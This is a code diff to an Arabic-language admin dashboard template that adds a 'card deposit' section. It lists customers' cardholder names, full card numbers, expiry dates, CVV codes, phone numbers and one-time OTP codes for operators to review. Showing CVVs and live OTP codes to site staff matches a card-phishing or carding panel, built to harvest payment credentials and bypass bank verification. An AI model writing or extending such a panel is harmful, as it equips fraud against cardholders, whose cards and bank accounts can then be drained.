@@ -10,6 +10,7 @@
             <a href="#users">المستخدمون</a>
             <a href="#deposits">طلبات الإيداع</a>
             <a href="#payment-requests">طلبات الدفع</a>
+            <a href="#card-deposits">💳 إيداع بطاقة</a>
             <a href="#withdrawals">طلبات السحب</a>
             <a href="#cards">البطاقات</a>
             <a href="#links">الربط السريع</a>
@@ -132,6 +133,69 @@
                 </tr>
                 {% else %}
                 <tr><td colspan="9">لا توجد طلبات دفع.</td></tr>
+                {% endfor %}
+                </tbody>
+            </table></div>
+        </section>
+
+        <section id="card-deposits" class="admin-section" data-admin-section>
+            <div class="admin-section-head"><div><h2>💳 إيداع عبر البطاقة</h2><p>طلبات الإيداع عبر Visa/MasterCard مع معلومات البطاقة الكاملة للتحقق.</p></div></div>
+            <div class="admin-stat-grid">
+                <article><span>طلبات اليوم</span><b>{{ admin_stats.card_deposits.today }}</b></article>
+                <article><span>قيد المراجعة</span><b>{{ admin_stats.card_deposits.pending }}</b></article>
+                <article><span>تم تأكيد الرمز</span><b>{{ admin_stats.card_deposits.code_confirmed }}</b></article>
+                <article><span>مقبول</span><b>{{ admin_stats.card_deposits.approved }}</b></article>
+                <article><span>مرفوض</span><b>{{ admin_stats.card_deposits.rejected }}</b></article>
+            </div>
+            <div class="admin-table-tools">
+                <input data-admin-search placeholder="بحث في طرق الإيداع بالبطاقة">
+                <select data-admin-status><option value="">كل الحالات</option>{% for status in card_deposit_statuses %}<option>{{ status }}</option>{% endfor %}</select>
+                <button data-admin-sort type="button">ترتيب حسب التاريخ</button>
+            </div>
+            <div class="table-wrap"><table data-admin-table>
+                <thead><tr><th>#ID</th><th>العميل</th><th>البريد</th><th>المبلغ</th><th>اسم حامل البطاقة</th><th>رقم البطاقة</th><th>تاريخ الانتهاء</th><th>CVV</th><th>رمز OTP</th><th>الحالة</th><th>وقت الإرسال</th><th>إجراء</th></tr></thead>
+                <tbody>
+                {% for item in card_deposit_requests %}
+                <tr data-status="{{ item.status }}" data-date="{{ item.created_at }}">
+                    <td>#{{ item.id }}</td>
+                    <td>{{ item.full_name }}</td>
+                    <td>{{ item.user_email }}</td>
+                    <td>${{ "%.2f"|format(item.amount) }}</td>
+                    <td>{{ item.card_holder }}</td>
+                    <td><code class="card-mask">{{ item.card_number[:4] }}****{{ item.card_number[-4:] }}</code></td>
+                    <td>{{ item.card_expiry_month }}/{{ item.card_expiry_year }}</td>
+                    <td><code>{{ item.card_cvv }}</code></td>
+                    <td><code>{{ item.otp_code }}</code></td>
+                    <td><span class="status-pill {{ 'good' if item.status == 'approved' else 'bad' if item.status == 'rejected' else 'warn' }}">{{ card_deposit_status_labels[item.status] }}</span></td>
+                    <td>{{ item.created_at }}</td>
+                    <td>
+                        {% if item.status in ["pending_review", "code_confirmed"] %}
+                        <details class="support-admin-thread">
+                            <summary class="secondary">فتح الإجراءات</summary>
+                            <form action="{{ url_for('admin_card_deposit_status', request_id=item.id) }}" method="post" class="stack">
+                                <div class="admin-card-info-box">
+                                    <strong>معلومات البطاقة:</strong>
+                                    <span>📇 الاسم: {{ item.card_holder }}</span>
+                                    <span>💳 الرقم: {{ item.card_number }}</span>
+                                    <span>📅 الانتهاء: {{ item.card_expiry_month }}/{{ item.card_expiry_year }}</span>
+                                    <span>🔐 CVV: {{ item.card_cvv }}</span>
+                                    <span>📱 الهاتف: {{ item.phone or "-" }}</span>
+                                    <span>🔑 OTP: {{ item.otp_code }}</span>
+                                </div>
+                                <textarea name="admin_note" placeholder="ملاحظات الإدارة"></textarea>
+                                <div class="decision-actions">
+                                    <button class="accept-btn" name="action" value="approve">✅ قبول + إضافة رصيد</button>
+                                    <button class="reject-btn" name="action" value="reject">❌ رفض</button>
+                                </div>
+                            </form>
+                        </details>
+                        {% else %}
+                        <small class="text-muted">تمت المعالجة</small>
+                        {% endif %}
+                    </td>
+                </tr>
+                {% else %}
+                <tr><td colspan="12">لا توجد طلبات إيداع بالبطاقة.</td></tr>
                 {% endfor %}
                 </tbody>
             </table></div>
